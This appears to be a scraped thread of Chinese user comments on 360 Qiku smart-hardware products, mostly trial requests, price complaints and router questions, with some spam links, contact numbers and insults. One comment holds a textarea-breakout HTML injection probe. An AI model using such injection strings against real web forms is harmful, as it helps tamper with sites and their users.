期待啊 我家也有宝宝 
家里有小孩，请让我试用下吧~~
 浮云~！ 12345
浮云~！ 真贵
爱车族表示非常的感兴趣 加油360
这个产品是我一直都想着手的 可惜现在市面上的效果都很差 价格也高
这个产品体验上会不会有不舒服的感觉呢 喜欢你的创业 可是不喜欢你的设计
傻了吧，这是电动的
智键还是蛮好用的。一键手电筒，一键拍照，一键开微信，已经能满足我的需求了。
用了一段时间，真的很方面。特别特别的感谢360！
360免费，全免费就好！
亲，试用一下下~！！！
他奶奶的这里面的产品 都超贵
专业体验，专业点评，专业推广
空气卫士，多希望能接到你回我家住一个世纪。。。。
怎么不是双天线，不知无线信号怎么样。
2个LAN口，是千兆还是百兆的啊？？？
果断给我来一台使用，让我体验一下
一看就知道买不起，不过看起来很棒，近视可以用更棒
当年用胶枪的时候就像用胶枪作画，现在就成3D打印了....
我也是这么觉得 360能不能具体说一下上市的时间！
你说的是360随身wifi吧？！~~如果是它是，需要一台能上网的电脑。将随身wifi插入电脑，再安装一个驱动就可以了~~~~
刚装修完的房子，迫切需要一台，我缺少氧气=-= 亲，试用一下下~！！！ 
这宝贝什么时候上市啊，大概多少米
我喜欢，在都市的车流中，有这么一台车，让开车一族羡慕去吧
啥时候能买了..会通知我们吗?
只有十分钟，玩毛啊，你家小孩玩10分钟就玩够了啊？出去玩的时候难道还要抗一堆电池。。。。。。。。。。。
感觉可以~~~
买过一部同类产品，外观没这么炫，但是也是和一般自行车一样，看不出是电动车，价格和这个差距很大~RMB3000~~
盼望试用啊，俺有这待遇吗
不会是真的吧
是真的嘛/
和手机怎么配对？对手机有要吗？
能免费试用啊，到时候试试
感觉很吊的样子....
应该是有车载的电源吧。也可以插在家用电上。
腾讯？ 什么情况？
路由和猫是不一样的~不过你可以把路由接猫上用~~
看不到有几个端口的，能不能分几条线出去？ 
很漂亮的一款产品
神回复……
这样做出来的不是蒸馏水么，喝多了好像对身体不好的吧
免费试用啊，到时试试 ，专业体验，专业点评，专业推广 。
还创意中？淘宝上早就有卖了，车载不适用，因为LED光会被前挡玻璃反射 影响视觉
这么多人，轮到我，几乎不可能。可能比彩票还难，别看概率。
请问有几个LAN口和WAN口？
好创意，稀饭
这个可以有
请问这宝贝自带无线吗？远程如何监控操作
小米mimi是MTK芯片的
我很需要，个人比较关注的是净化能力、噪音控制、产品价格。
这个宝贝好
应加快上市
信号强度？能胜任的最大区域范围多少啊？
这样的水是净化可后的雨水
69人民币估计有市场的
ios不行？
有云端就果断拿下了  看价钱差不多
分析的非常到位。麦步开始不错的。
只能安防才有前途的
后期是可以挂近视镜片的
可以重复充电的，是充一次电可以玩10分钟左右。另外是可以用充电宝给飞机充电的，不是用干电池的，所以不用抗一大堆干电池，呵呵
监测PM2.5的设备很高级精密的. 这种设备国内的公司还做不了, 都是进口的.
360的东东就是好 高科技！
看来需要有艺术细胞才能创作美丽的作品
能当行车记录仪用么
5500这是要抢劫啊
好像挺牛，就是外观不够科技感，也不知价格如何
好东东！期待中~！
亲，试用一下
感谢支持，期待麦步尽早适配低版本的安卓系统手机应用，打开市场。
这个价格完全可以用笔记本的Intel i3移动平台. 性价比一般.
广告成分大吧  怎么就算奇酷了呢
谁要是打个喷嚏，哇，是不是挺嗨！！！
范围多大?信号怎么样?
最好的办法是多买两架替换着玩
北京空气太差了，我正在考虑空气净化器的事情了，需要一台好的空气机来拯救我了，看TCL的机器介绍不错可以试一下哦
学校用的锐捷客户端，能用该路由器吗？ 怎么用？
这种设备关键时候能救人的. 比如救助困在河里湖里的人. 一般P民被困, 不能指望出动直升机.而靠消防员那种原始工具和方法救援可能跑不过死神.比如之前有人在河里钓鱼, 上游水电站突然放水, 困了几个小时在数百人眼下被冲走. 如果有八轴飞行器(四轴载重可能不够) 5公斤载荷 20分钟工作时间, 完全可以投送一件救生衣. 这个生存几率会大大增加.
无线连接WIFI，手机。平板都可以
看了一天也没能看明白 这玩意是干嘛用的
给上面安装个摄像头，可以在办公室通过网络查看地面哪儿不干净去清扫。
品质生活需要品质空气浄化器，请给个试用机会
希望能预防在口袋里乱挤的问题
这个做完了以后，加湿器是不是又要大卖了
什么时候出啊
只能家居安防才最有前途！！！！
天天开车的人很需要
期待试用，设计挺新颖的，效果可以的话，给父母也装台。不知道滤网价格怎么样，别换一次超过买一台。
这个好，放车上又时尚又实用
请问用这个的时候需要开电脑吗
办公室用 小巧方便
请问有几个LAN 我台式电脑插网线的能用不？？？？？
用心的妈妈，赞一个，很不错的皇冠，主要是女儿喜欢
200左右可以接受
好办法。哈哈
看上去还是蛮吸引人的 
有水箱么？室内湿度怎么保证。
我们可以试用一下吗？？可以申请一个试试？？？ 
虽然后期可以挂近视眼镜，不过第一中国上市肯定晚，第二上市价格贵，第三镜片肯定需另购，第四镜片价格（近视镜片）价格会更高，所以一句话没钱还是买不起。
这个是怎么刹车的
请问有几个LAN口和WAN口？ 
非常好用的宝贝，方便快捷
呵呵，空气要多干燥呀
哈哈，我咋没想到这个办法呢
这东西淘宝有《魔光球负离子空气净化机家用去甲醛除烟净化器pm2.5负离子发生器》
超酷的玩具，估计买了以后，自己先玩一阶段。
续航能力有待考验
房子装修号半年了。一直放着通风不敢进去住。。
电池爆炸了就死翘翘了
卖肾呗，哈哈
电池爆炸就爽了
真贵 猛一看还以为 是水洗
合适能买  超喜欢
什么时候能买？？？
上次刚在小米官网上看到这样的东西，可是小米上抢不到，没想到今天在这个网又看到了，而且也轻松预约，不错。
我想要 哪里有卖
比这个更好的手柄早就有了，不过那个手柄有点贵，不过玩游戏真的超爽。
哇，我要这个，360快点量产。。。。
不可以插硬盘吗？
赞啊~~这个我要试用，不给我就买，一定要告诉我~
好东西，如果出了记得告诉我~我要，希望价格不要那么贵~~~
10000多
可以做代理不？
我已经提交过了，怎么还要啊？
支持长城宽带的域名解析吗？
很好，很不错。其实奇酷创造的东西很多，也很好。这几天最喜欢的就是MIVIPOWER 智能无线充电底座，不过可惜啊。没抢到，最重要的一点就是你们创造的东西好是好但是价格太贵了，少的五六百多的六千多，真心喜欢，但是真心没钱买。
额。。。。
我觉得这东西在北京不太用的了啊→_→
Vigo 智能贴心管家服务 太好了
 产品挺好 喜欢iSmartAlarm－智能家庭安防系统
蛮好 有创意
硬座宝 颜色好看
 Nod 智能戒指 指点江山智能时尚 只是外观太土鳖
东东挺好 价格也不错
好期待的产品 希望能试用 我家住的这边好多饭店 空气都有油烟味 谢谢了
最智能 最潮的产品  可是我不是土豪
太酷了  就是5000买个眼睛  有点贵
 GoBe 可穿戴自动检测仪 ，能够帮助人们用更好的方法来管理他们的饮食和掌控自己的健康水平，从而随时随地了解自己的生活状态。喜欢等上市一定买一个。
嗯，准确度还是不错的 ：）
3Q和好了？？ 
现在轿车上面的OBD接口位置有没有这个大空间，以便放置这个东西
哈哈 啥也不穿更透明
哈哈 蛮有情节的
看起来真不错，好想要
以选择提交  没有回馈信息
是啊，多多宣传下吗，我也是前几天买的小米盒子，早知道就买这个了！
真的不错，主要是能给父母和刚出生的Baby一个安全、健康的室内环境。
感谢奇酷，小小的键，大大的用途，智能机用的太方便了
我的车是天籁超级(ˇˍˇ） 想～  要这个宝贝    问下能检测胎压  和远程用手机  看状态吗 
怎么购买？？？
如果是真的，感觉有点胖。。。
能直接插光钎吗？
期待中。。试试看效果
个性的新东东 真想弄一个试试
那我老婆还能干什么
太有才了全身充满了艺术的细菌啊
这个东东不错
信号强度是多少M？能胜任的最大区域范围多少？
会不会太重……体积有些大，且很突出
说实话……有什么用吗……用来表白不如用来给警方确认犯人
感觉不错的样子，很期待这次试用。
鼠标垫必须连接电脑，这样还有什么用……
电池容量如果能扩大，能飞大约1小时左右，那就不错了。
好无聊的东西
装修好房子有味，看到这款很漂亮喜欢。
装修好房子有味，看到这款很漂亮喜欢。
可以作为礼物送给老婆和朋友哦，关心身体健康的礼物是最好的哦。
这个小东西非常实用，而且很便宜！
我预约了N次都还没有消息
我想问一下360安全路由器和360随身wifi有什么不同吗？360安全路由器和360随身wifi一样是得开电脑才能使用的吗？？
真不错。可以有。
360安全路由器这可以连接机顶盒吗
我就是学生
能不能接U盘或硬盘，进行下载东东？
喜欢##***
应该把这种红外感应里面装网络针孔.这样报警同时又能看清家里动静...这种传统红外报警十几年前就有东西了!
有没有详细的介绍，如果可能接移去硬盘，控制其它产品就跟得上小米，如果不是就有一点距离了
无线的路由还是有线的啊
我也想知道这个问题
这是路由  插网线用的，wifi是插usb接口。。比如你一台没有无线网卡的电脑就需要随身wifi
我是第一次登录奇酷网，这应该是360的网购网站吧？！ 当我填写预约资料的时候（预约所谓的安全路由器和360智键），在提交的时候，提示输入“姓名”时，居然直接跳出了我和我老婆的真实姓名（双击下拉可以选择），我表示从来没有注册过360的任何一款产品，也没有在360的任何产品里主动留下任何自己的真实信息！ 今天居然在预约的时候直接跳出了我和家人的真实信息资料，请问这算什么安全？！ 360果断不能要！！！
220V 打火不挨崩 你就念佛吧
我和家人的PC上的防毒软件是360，手机上也有用360，但是从来没有注册过！那请问360，你是如何得到我和我家人的真实个人信息的？！ 请360给予解释！！！不能因为免费而伤害到用户的信息安全！！！ 免费不是你用来劫持用户、开脱责任的理由！！！ 作为一个安全厂商，还希望你可以给予解释！！！
自己怕安全信息泄露，就每次用完电脑把电脑中的COOKIE完全清除掉，什么？？不知道COOKIE？？那你乱投诉个什么劲~
没有试用？给我试试 好玩不
呵呵！！！又见装B侠！！！ 你以为就你知道？！ 我也是做IT的，清cookie，清cache，删host，这些基本的安全措施谁都知道，用得着你在这当圣母给我科普？！出门左拐，不送！！！ 我希望的是360官方给我解释，如何得到我的信息了，可以不公示出来，但是需要给我个人回复一封邮件，我相信360可以找得到我的邮箱地址的！这涉及到我个人对360产品的信任！ 劝那些装逼侠，别自以为是了！！！
真贵阿。在中国估计没有人会用这个~！都直接用小音箱了。才30多块钱~！
很好，家庭里面可以多处摆放这个
班门弄斧，贻笑大方的东西！！！
有遥控飞机可以玩。为什么非要搞个弄手机控制的~！
对于我来说，360智键的快捷拍照，录音，使用蛮方便快捷。就是在刚使用时，插入时老是显示说“在插入时请不要按压按钮”，就是这一点蛮不方便嘞，弄了好几次才插好。还有就是苹果手机什么时候可以支持嘞？
这玩意市场价基本都是一万以上的，不懂的人别瞎评论！
16G多好。。。。。。
特斯拉的车外形车技看着很科幻，但是说实话其电池技术还不如比亚迪！国人崇洋媚外太严重了！哎！
毛线， 为什么不去看看明基的相机！！！
好期待的产品 希望能试用 
都上万了，对于自行车来说普及不了
是做只能家居的吗？可以做代理吗？很想加入这个行业
这尼玛是改良版**棒么，看起来略坑，希望你的意见能反馈到商家，尽快做出产品的改良、调整，至少从操作性上要简化，用料上环保、无害吧
好贵的灯啊
╮(╯▽╰)╭。。
外观唔系甘好睇
&lt;/textarea&gt;&lt;embed&gt;
我就想把水星路由器丢了，信号时强时弱很不稳定！
介绍写双天线，图片单天线，那个才是真，只有一条辫子不好看。
我也很想加入智能硬件的团队 我可以做到事情很多。。。 
请问这款路由器有几个有线接口的呢？
十多天前才买了TP，觉得这款便宜，听起来也不错，想买又不想买。望高人指路?
怎么感觉像胶枪？？求解~~~
忘记说明，所用的浏览器是360浏览器。 刚才尝试在vmware里运行360浏览器（win8），居然也有我个人信息，实在无解！ vmware我一般只在测试时使用，系统里不存在什么cookie！ 求高人指点，这怎么实现的！
不错是个好东西，给父母的血压什么健康等等的做监控
好家伙，可以当无间道或007了
呵呵。我只能讽刺的说声，黑的好
APP远程遥控确实很新颖
操作简单点，这样老少都会用就行了
这个预约是什么问题，，是怎么回事你应该答复一下啊
应该可以吧 
用途不大，就是夺人眼球的奢侈品。
不预售吗？
晕，坐等深圳小工厂。。。899美元啊！来到天朝加税9000块了。。
这东西家用的话会不会造成室内干燥？这样住地下室的有福了。。可以买个这东西，喝水不要钱，还能干燥室内。。高层的就算了。。室内还得加湿呢。。。。国内大巴上压根用电的就不多啊。
这个需要两台苹果设备啊，这有点不现实。。
移动运营商该研究远距离无线充电，选你的号，就永远在线。。。多美啊。。
这东西应该在OBD接口弄个小型无线收发器，上面的盒子装上投影，直接在车玻璃上显示结果或者指引方向。。
23岁的小妈妈 厉害
当然不行，光调制解调器(光猫)还是需要的。。。
“高额的GPS流量”？手机不插卡不联网也能连GPS。
感觉不错，可以一试。
毛用 应该继续设计成手机壳能通过太阳能自充电的  那样手机都不用插电源充电了
我还专门点进来看看，到底是什么原因让你打最低分，结果啥都没看到
还不如买个无线路由器
插座做成86面板好不好...
这和热熔枪差不多啊
哪里可以买到？
冒似一把热熔胶枪
PM2.5出来的水能喝吗？
城管来了，快交罚款
挺好玩的。外形要是能更漂亮一些就好了。
很好的东东，希望价格不贵，
开车好帮手啊，能不能给我试用啊，不给我就买，一定要告诉我，但是希望价格合理，不是很贵
这个问题有点意思。诺基亚手机都可以打电话发短信上网了，苹果为什么非要出个iphone？哈哈，类似的问题还有一大堆。手表都大把了为什么非要弄个智能手表。。。。
新版本耗电比较多
你二B吧。。不直接插光纤。。。你啥地区啊还用猫呢
我也想问这个问题……
不错，顶一个……
看着这个感觉电量是个大问题，而且电池和核心部件都放上面不知道会不会重。其它的感觉倒是挺不错的，出门听歌面前不用各种线子了倒是方便
支持360的产品，赞一个
我想试用，怎么申请啊？
现在已经这些功能的只能手环已经出来了，一方面就是检测的准确性和充电问题，另一方面就是价格昂贵
这种智能折叠电动自行车也只能是有钱人的一种玩物，对于普通消费者来说还比较遥远。
试过，才知道真正效果
看到这价钱，是属于小众产品。
什么东西？？看不懂。。。。
zhe shi sha ?
期待中···········感觉好神奇。
会不会把空气搞的很干燥？
现在在搞的青春版一人顶一角活动最终价格1499貌似很值得入手啊，我已经预约成功了，希望能抢到
我们这都是需要猫的。
试用也是为了帮助开发者改进！
非常不错哦
他问路由器，你看那路由器有光纤接口？
感谢支持。
建议考虑一下大众的消费水平。
很简约时尚
什么时候能月月购买呀 
什么时候出4S的？
360做的是民生工程，他们可以不赚钱做硬件，这对我们消费者来说是好事。你这样黑360.你良心被狗吃了吗？
外形不错。功能有待验证。
感觉不错。喜欢
这个可以升级一下 设计多种笔头  还可以设计修正笔头  让造型更加丰富！ 
欢迎来珠海麟盛，不一样的智能家居，更新的生活理念。
你可以和我们联系
你可以联系我们，并附你的简历。birch@leadsun.com.cn;http://www.leadsun.com.cn
如果是带有遥控器的可以学习遥控器功能，如果是不带遥控器的，例如普通常用的洗衣机之类的，可能就不是普通智能技术来实现了。如果是一些普通不带遥控器功能的，使用无线遥控开关就是很实用的。麟盛。
信号还不错~和300M的差不多，使用方便快捷，登录方式也灵活省事！！真的是个随身的好WIFI......
怎么购买呀
都是英文吗？如何看懂？
黑的漂亮啊
黑的漂亮A啊
以为是跳蚤··
跟线充没什么区别，只是一个摆饰品。
这是啥玩意？ 
关注360支持360的产品，给个赞。
飞10分钟充电要20多分钟。。。也还贴上来
目前市面上类似的产品太多了，而且比Swann便宜不知道多少，效果没什么差别，这个肯定火不起来
国外不敢说，国内暂时是行不通
这种产品关键要看算法怎么样，不然要打扫整个房间要花太长时间，也浪费能源
这个产品确实很有前景
自行车哈/
适合我对智能家居的长期关心
好漂亮！！精致
路由后边到底几个插口，两个还是多个？ 天线有几根，一根两根？ 
那么高速的跳蛋你口味珍重
光纤不用光纤猫？你光纤直接插到电脑上试试看
路由器是接宽带，然后可以使用电脑或者wifi接受无线网络。无线wifi是插在电脑上，转化电脑网络为wifi信号。个人认为无线wifi对于经常出差的人士更有用，比如在酒店里只有网线连接笔记本电脑而不能用手机使用wifi。
路由器是接宽带，然后可以使用电脑或者wifi接受无线网络。无线wifi是插在电脑上，转化电脑网络为wifi信号。个人认为无线wifi对于经常出差的人士更有用，比如在酒店里只有网线连接笔记本电脑而不能用手机使用wifi。 
路由器是接宽带，然后可以使用电脑或者wifi接受无线网络。无线wifi是插在电脑上，转化电脑网络为wifi信号。个人认为无线wifi对于经常出差的人士更有用，比如在酒店里只有网线连接笔记本电脑而不能用手机使用wifi。 
过来支持一下！测评很精彩哦！
简约而不简单，期待。。。
这个可以扩展容量加装插件吗？
土豪用的产品啊，老百姓，望尘莫及。。
支持啊啊，不错
这是要浪费电么
哗众取宠多吧，觉得不靠谱
可惜贵了点，我经常忘喝，这个倒蛮好的
如果兼容性好的话！还是不错的产品！
只支持苹果？！土豪专用啊……
有意思，边洗衣服，边锻炼！
越来越贴心
支持360的产品，赞一个 
不就手机网络转wifi信号么，几年前的东西了，流量资费低点就谢天谢地了，联通3g都够快了
哈哈，不用跟这种小白见识——很多人以为装宽带的前一根网线进来告诉他这是光纤他就以为是光纤了。其实说的&quot;光纤“不过是进到小区里是光纤，到户还是网线（双绞线）。当然可能有些地方发达到电脑都直接有光模块了，那到可以直接插光纤……不过楼上那位说的应该不是这种情况
蓝牙4.0独有的省电模式未来各大手机上系统都会升级对它支持的，请耐心等待，据说小米3联通、电信版已有4.4安卓rom，移动联发科CPU五月底六月初支持，至于华为，就要看华为的开发能力了
哈哈，不用跟这种小白见识——很多人以为装宽带的前一根网线进来告诉他这是光纤他就以为是光纤了。其实说的&quot;光纤“不过是进到小区里是光纤，到户还是网线（双绞线），但是很多人傻傻的分不清以为那就是光纤了。我想天朝还没有发达到电脑都自带光模块的地步。当然有光纤猫和路由器结合在一起的产品。
目前无线的应该是4口，不算wan口
想想周总那么调皮，肯定是无线路由器呀。你想想手机、平板之类的需求。当然无线路由器也是需要线的
正是我想要的！！！
估计30秒只能把腿吹干
虽然没见过，但是查看别的路由器就知道了，wan口一个，lan口4个不会更多。不管是哪个品牌的路由器在装逼原理都是一样的，这个多年的结构应该也不会变
对于这款安全路由器，我想弱弱的问一下周总，要是我用360安全卫士、杀毒……+xx品牌非360路由器是不是很不安全啊？！！  比如水星的无线，价格只要这款的一半
三个黑圈？？？还是国内生产标准？
好有感觉。。就是有点贵了。。
我靠，好坑爹，这么贵哦。。。。。表示200以内可以接受！！
130美元，表示难以接受。。360不能找些合作商，制作自己的的吗？？宣誓高外链，没意思。。
好东东，啥会面世啊？GOOGLE现在也有类似软件，但太费流量和电能了
什么都看不到  有几个接口？ 多少M 150M 300M ???
会很容易掉吗？
羡慕嫉妒！！！  看起来不错啊！！！！
我的电源键坏掉了，这个能解决么？
这个要3000元....扔了吧
试用金要这么多,你抢吧
哎呀~~~腾讯的
我连续七次才中一次好吧，不要嫉妒。T3估计没什么戏，但后面还是有机会的。
感谢支持，你才是我学习的榜样啊。
嗯，祝你好运。
这是看过写的最好的一个评测，比较详细！屌爆了！顶顶顶
但手机一般不用就放兜里 谁走拿在手里晒太阳......
感谢大家喜欢我们的产品，希望大家多提意见，可以发消息给我，我们也不不断改进我们的产品！
世面空气净化机太多，希望让人放心！
看着不错，就是价超所值了，一个简单的杯子而已，快够一年喝水的钱了
可惜了，没有ios的
有过敏性鼻炎，不知道这个有没有效果！功能挺不错的！期待试用！
等待试用，期待效果,回馈消费！
你咋知道360有的.....
期待效果,回馈消费！
这个主要是给原来买过带dock功能的音箱用的，早期很多带dock的音箱都不支持Airplay，但是又很贵总不能扔了吧。而且现在iOS设备都换新的lightning接口了，也没法用原来的dock音箱了。
这个很有创意，一般的车不行吧
用了试过，有时候会自己一直弹出来选择的选项，有时候又会失灵。已经设了开机启动还是这样 
确实非常棒。很有参考价值。挺想买一个回去用的。
已经买到了 非常喜欢 本人非常喜欢阿狸 同时也是360的支持者 果断买了
如果测血压，测血糖的仪器再多一些，而且又能代理，实物销售，会议推广，就更好了。
一天的水分摄入不止是喝水啊，饮食中也包括（汤、粥、水果什么的），这个部分就不能监测了吧？
什么都看不到 有几个接口？ 多少M 150M 300M ???
 什么都看不到 有几个接口？ 多少M 150M 300M ??? 
这个绝对可以有！即使车子使用内循环，往往还是能闻到外面的汽车尾气味道，而且内循环本来空气也不好～
360跟腾讯和好了？哈哈，现在360做那么多有创意的东西，又让我看好360了
痛感 313571476
越来越看好360了
飞机玩的是性能，不是时间。您要是定做玩一个小时的飞机，只有您肯付钱随时可以给你定做。真飞机都可以，不是吹牛的。
不仅是净化，还是智能的。顶起~
果断下手，如果你手机无法满足条件的话建议买全功能版，带蓝牙通讯器。
客气了，有帮助就好。多谢支持
预定了什么时候可以买
期待中哈，，，，，，，，，，，，，，，，，，，，，
你买的哪款TP  五折处理不
喜欢，快。快
做木乃伊用的？
肯定不安全。属于裸奔路由。建议换360路由器吧。多便宜啊。
哪里有卖  我车里味道大呀   急需这种东西
技术帝赞一个！
感觉不多不知道有没有白色的
新版APP只有单击了，总体还是很方便的，锁屏偶尔不管用——Note3。
很好，期待中！！！！！！
我也这么想，感觉很不安全，碰到危险情况必SI无疑
不错的创意
飞远了超过接受范围会怎么样？
等待试用，期待效果,回馈消费！希望可以第一次参加试用就成功等待中。。。。
预购什么时候放到额？
高度智能，值得推崇。
蓝牙4.0独有的省电模式未来各大手机上系统都会升级对它支持的，请耐心等待，据说小米3联通、电信版已有4.4安卓rom，移动联发科CPU五月底六月初支持，至于华为，就要看华为的开发能力了 
电动的吗，
等待试用，....
支持360的产品，赞一个  
这个试用报告真是全面啊！！赞一个
关注360，360的产品真的不错！
空气会变稀薄吗？
这个不错。。。
好东西啊。。可爱
有细菌过滤？现在空气中各种细菌，包括传染病菌，想想就可怕，这个还敢使用？
uplane控制软件在哪下载？我想下载。
等待试用，期待效果
期待...............
是不是可以智能联网报警 
我按错了，我不想要请不要发货 用户aaa1153661970 
会自动切断马达输出
ios在appstore 下载uplane，安卓版本还在测试，还没正式发布
不错哈 建议可以做成多彩外形..
我感觉东西很好，希望有机会试用
外表还可以，但是没有和其他的闹钟有较大区别，感觉没有一种大家想购买这款闹钟的主要特点。就像有一款闹钟，要关掉它就要用红射线枪打准闹钟得中心才能关掉。
额  意义何在
嘿嘿~说得对啊。。当妈不容易呀，不吃家里也不愿意~ 羡慕身材好的MM呢~ 以后有麦步，可以监督我多运动运动。。
很喜欢这款设计，可以让大家随时知道自己的身体状况，特别是如果给老人和小孩使用的话，家里人将随时可以了解到他们的身体情况，就可以很放心了。肯定会受欢迎的，希望价格不是很贵。另外有个担心，辐射大么？戴到头上会不会有影响？这是希望可以考虑进去，加油研发更好。
产品很不错。外形如果再帅一点就好了。
100百多万的车到你们嘴里就变了味了。
我的手机版本太低，用不了，还是感谢360团队！
没有线了感觉挺好的，不过感觉没有麦，听不到自己唱的歌，如果有麦，可以听到自己的歌，并且通过这个耳机上传到我们的网站去就好了
写的1200m，我不太信
赞同。确实是这样
挺好的，很有意义，不过价格确实如 “度量衡之弥勒” 说的，这个到家庭使用的话，可以再看看有没有一定成本的节省，下降点价格。像洗衣机一样，有一定的价格区间，有选择。现在大家都还是挺支持环保的，家里的老人对于剩的东西也舍不得丢掉，有个再利用最好不过了。
希望能拿着
希望有机会试用 
噢哦，如果想偷偷发下花痴，结果~~衣服透了~
好大，估计也挺重的，现在出来的话大概很少人有用，现在戴的话夏天很热的。再改进点就更好了
希望有机会使用，会写一份完整试用报告，体现文字的风采
价格昂贵，而且没有较大普及，维修之类的麻烦，实用性也不是很大，如果可以加入一部分空气净化就好了
2楼正解，确实就是一个，这和3D打印机有半毛钱关系？
好像没有中兴九城的funbox配置高，一样的价格，有点纠结
有这种车啊，但是你能买得起吗
跟网游小说里的虚拟游戏机挺像。。。
无爱，，，外形挺难看的
是时候体验高中生的文采了 祝我好运吧  阿门
日本货，不要！ 
我感觉东西很好，希望有机会试用!!!!!!!!!
全国上下  光纤都用光纤猫   就你家“光纤”直接插电脑上面  你不懂就算了  还要装懂。
这款车没有座位，每个轮子都是单独控制，上面都有一个脚踏板，它的工作原理类似漫步机，不仅仅是需要踩下踏板，还要把踏板再带起来，这时候踏板上的皮套就发挥了作用。骑行过程中，两脚要交替上下，这样更便于发力，此时人身体还要保持平衡   岂不会很累？？？
说 实话 我买个 电池不更好 原装的 也才200 买普通的几十块 而且最少2000毫安 主要是 体积更小 口袋一放 没电直接换 当然 像苹果的不可以换电池 我也会买个上W毫安的 移动电源不比这个好 
用那个灯杀菌 估计对电子产品有损坏把 而且手机本身就有电磁辐射的 
估计是2个小时 10%的节奏 而且一样要电源 我还不如带 充电器 然后找个咖啡馆 什么的 充就行了 
我感觉东西很好，希望有机会试用!!!!!!!!!
我感觉东西很好，希望有机会试用!!!!!!!!!
怎么买不到
,olmjnhm仔4
好期待、、、、
人太多了抢不到
东西看着不错，不知道用着如何？
创意很好。
什么情况呀
怎么预约不到阿
不知对甲醛净化方面怎样
如果可以带行车记录仪就好了。
看着好粗糙。。。
叼屌刁碉diao
家里有房子正在装修，希望得到试用的机会，表示感谢！
怎么预约不到啊，怎么买不了
兄台，我肯付邮费，可以发给我试用吗。真心希望能够得到你这位幸运大神的眷顾。。QQ365362785 
身边大多手机控，这个手机遥控的功能着实让人眼前一亮，期待ing~~~
再来个智能迅速降温就完美了。
就是啊，怎么预约不到呢？
怎么不能买啊？？？
这个东西好，神器！
很想要，吸引人士特别适用，远程开启很必要
珍爱生命，远离雾霾，且用且珍惜
怎么预约？
对啊对啊，如果整合行车记录仪功能肯定会买的
造型非常漂亮啊。
现在的空气污染太严重，每家都需要这个
如果开卖，请及时 让我知道！
开卖请及时让我知道
换个可爱或者科学范的造型我相信喜欢的人会更多
电源键坏了，手机就可以扔掉了
 还能输入67字 http://www.weishi.com/t/200451908309960?pgv_ref=weishi.share.video.2004519083099600.qzone   同时分享选中图片  send分享给指定好友 同时转播到我的腾讯微博 分享 Copyright © 1998-2014 Tencent All Rights Reserved获取分享按钮反馈建议 × 
UUYYUK
我期待用这个产品
还是电动助力车比较好，又可以锻炼又可以代步。
超级喜欢这种有创意还实用的产品。赞360，赞奇酷网。
超级喜欢这种有创意还实用的产品。赞360，赞奇酷网。
这个头像不是第一看到了，有时觉得你好可怜。
gps是靠卫星的。只要你有GPS模块就好了
我也想知道。希望能有一个提醒的功能。
关注一下，还希望有更多信息
我能说,这东西太好了吗
需要的，你让吗？
怎么购买啊？ 我预约了！可是页面总是重复啊
一样的  我也是这样
东西很好,很实用
+1,我操
艹！骗子！永远是预约成功！
神经病，既然进不去购买画面，360网页在忽悠人吗？？？？？？
咋没有购买的地方
我支持这样的好产品,希望能试用,期待中！
假開賣，笑死人！
骗子，骗子，骗子，一直让我们在这两个网页间循环，饭都还没有吃呢，饿着啦，你360团队陪得起吗？大家赶紧先吃饭吧，我是不敢相信你们啦360骗子！...
试用还不错，刚刚在天猫电器城拍了三枚，9.9+6元。。http://detail.tmall.com/item.htm?_u=9u6ekd98c0&amp;id=38586425410
擦 预约成功 在哪买？
怎么购买？？
你的目标是女版钢铁侠么？
逗比你好，逗比再见。
70多万啊啊啊。。。
预约成功 它开卖的前一天会发短信  短信里面有链接  在电脑里输入那个链接 点击去购买 就好了
购买页面：http://detail.tmall.com/item.htm?_u=9nrcag64934&amp;id=38586425410
购买页面：http://detail.tmall.com/item.htm?_u=9nrcag64934&amp;id=38586425410
购买页面：http://detail.tmall.com/item.htm?_u=9nrcag64934&amp;id=38586425410
购买页面：http://detail.tmall.com/item.htm?_u=9nrcag64934&amp;id=38586425410
购买页面：http://detail.tmall.com/item.htm?_u=9nrcag64934&amp;id=38586425410
也不知道这帮饭桶怎么做的引导，我也是找了半天，都马上开始了，我看了一下短信，引导到zhijian.360.cn，然后才到天猫的购买地址去购买的
也不知道这帮饭桶怎么做的引导，我也是找了半天，都马上开始了，我看了一下短信，引导到zhijian.360.cn，然后才到天猫的购买地址去购买的 http://detail.tmall.com/item.htm?id=38586425410&amp;spm=a1z09.5.0.0.tBcBx9&amp;_u=81jmn06db7d&amp;mt=
也不知道这帮饭桶怎么做的引导，我也是找了半天，都马上开始了，我看了一下短信，引导到zhijian.360.cn，然后才到天猫的购买地址去购买的 http://detail.tmall.com/item.htm?id=38586425410&amp;spm=a1z09.5.0.0.tBcBx9&amp;_u=81jmn06db7d&amp;mt=
我喜欢，与音箱合一就更好了
能让它支持学校锐捷认证后宽带连接吗？？想买这路由器，但学校弄了一个锐捷认证
外形不好看
什么时候开卖，请让我知道，我很喜欢这款杯子！
便签也要电子化了？这个适合拖延症的办公室人群啊。
人力的哦························
可以拿来测体温吗？
高富帅童年必备玩具！
你的泛泰a870很不错
我用是Find9007,蛮好，支持国货。
我想说的是：可以用来蒸包子吗？
貌似没有什么亮点啊
最好是能洗一些小件上衣等就好了。
设计成能按在眼镜上的把，或者设计到手表上。这样的设计我们眼镜族没法用啊，而且这个可以带一整天，这个样子的没法出门用，只能室内办公时候用。
期待在奇酷网售卖啊。到时候买一个玩。
很棒！希望能够拥有
现在的城市空气质量实在太需要这样的好产品了，特别家有个小宝宝，
儿童卫士2代，太帅了。好想买一个啊。
这个产品已经有了啊  还用的着期待吗？ 
期待早日能用上
话说这个怎么买？？？
我是反正是不会喜欢一个身体都给别人看光了的人
什么时候能卖啊？很喜欢。
可以买？？？？？？？？？？？？？？？？？
期待、期待、再期待……只因你的到来！所以我来了，么么哒~
几号才出呀！ 
希望产品质量和功效都能好用
快开始卖吧
前排支持一下
在等微薄活动
给力！500以内我就买一个！！！！！！！
这边已经出来了  微博还没有
一直等着呢
活动？怎么什么都没看到呢
这是价没出来还是活动内容没出来
比一代精致多了，上档次，赞一个！
怎么预约呀
看着真不错，喜欢，希望拥有
喜欢。。。送一个啊？？
孩子上学很需要
新一代的产品，真心期待！
价格不是很高的话可以考虑的
好可怕。。。
已经可以购买了
非蓝牙4.0怎么办？
真的吗？                             为什么？？？？？？？？？？？？？？？？？？
期待新品。。。。支持奇酷支持360
怎么购买啊
2代这么屌啊 还有随行功能！ 就是没说电量多少？ 续航多久？
非常不错 就是不知道使用效果怎么样
好期待啊。儿童卫士2代。
这个不错是不错 但是容易掉 改成手表式什么的应该不错
嗯嗯，不错，喜欢喜欢，很牛叉！ 很想要
